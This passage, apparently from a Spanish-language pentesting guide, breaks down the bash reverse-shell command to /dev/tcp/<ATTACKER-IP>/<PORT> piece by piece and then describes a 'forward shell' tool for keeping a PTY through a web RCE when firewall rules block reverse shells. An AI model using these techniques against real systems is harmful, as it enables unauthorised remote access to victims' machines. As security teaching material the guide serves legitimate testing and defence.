#### Explicaci√≥n de Shell

1. **`bash -i`**: Esta parte del comando inicia una shell Bash interactiva (`-i`).
2. **`>&`**: Esta parte del comando es una notaci√≥n abreviada para **redirigir tanto la salida est√°ndar** (`stdout`) como **el error est√°ndar** (`stderr`) al **mismo destino**.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Este es un archivo especial que **representa una conexi√≥n TCP a la direcci√≥n IP y puerto especificados**.
* Al **redirigir las corrientes de salida y error a este archivo**, el comando env√≠a efectivamente la salida de la sesi√≥n de shell interactiva a la m√°quina del atacante.
4. **`0>&1`**: Esta parte del comando **redirige la entrada est√°ndar (`stdin`) al mismo destino que la salida est√°ndar (`stdout`)**.

## Forward Shell

Puede encontrar casos en los que tenga un **RCE en una aplicaci√≥n web en una m√°quina Linux** pero debido a reglas de Iptables u otro tipo de filtrado **no puede obtener un reverse shell**. Este "shell" le permite mantener un shell PTY a trav√©s de ese RCE utilizando tuber√≠as dentro del sistema v√≠ctima.\
Puede encontrar el c√≥digo en [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Solo necesita modificar:

* La URL del host vulnerable
* El prefijo y sufijo de su payload (si los hay)
* La forma en que se env√≠a el payload (¬øheaders? ¬ødata? ¬øinformaci√≥n adicional?)

Luego, puede simplemente **enviar comandos** o incluso **usar el comando `upgrade`** para obtener un PTY completo (tenga en cuenta que las tuber√≠as se leen y escriben con un retraso aproximado de 1.3 segundos).
